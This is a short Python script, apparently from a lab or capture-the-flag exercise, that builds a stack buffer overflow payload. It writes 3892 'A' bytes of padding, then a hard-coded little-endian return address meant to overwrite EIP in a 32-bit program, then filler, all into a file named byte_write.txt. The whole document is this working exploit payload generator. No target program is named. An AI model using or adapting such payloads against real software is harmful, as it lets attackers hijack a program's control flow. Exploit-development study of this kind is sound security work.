#!/usr/bin/env python3

# build the pieces as bytes so we can concatenate cleanly in Python 3
buff = b"A" * 3892
eip  = b"\x2b\x86\x04\x08"
offset = b"C" * 6

buffer = buff + eip + offset

# write as binary
with open("byte_write.txt", "wb") as f:
    f.write(buffer + b"\n")

